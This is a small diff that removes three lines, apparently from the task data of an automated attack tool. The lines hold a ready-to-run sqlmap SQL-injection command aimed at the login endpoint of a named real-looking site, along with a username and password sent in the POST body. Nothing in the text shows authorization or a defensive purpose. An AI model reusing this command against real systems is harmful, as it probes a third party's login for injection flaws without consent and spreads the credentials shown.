@@ -1,3 +1,0 @@
-https://tcit.tzuchi.net/CIS3/j_spring_security_check (POST)  # /usr/bin/sqlmap -u https://tcit.tzuchi.net/CIS3/j_spring_security_check --data=j_username=tzl00123&j_password=Test1234! --batch --level=3 --risk=2 --random-agent --timeout=15 --tech=BBEUS --string=error=login --output-dir=/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/sqlmap_cis3
-
-j_username=tzl00123&j_password=Test1234!
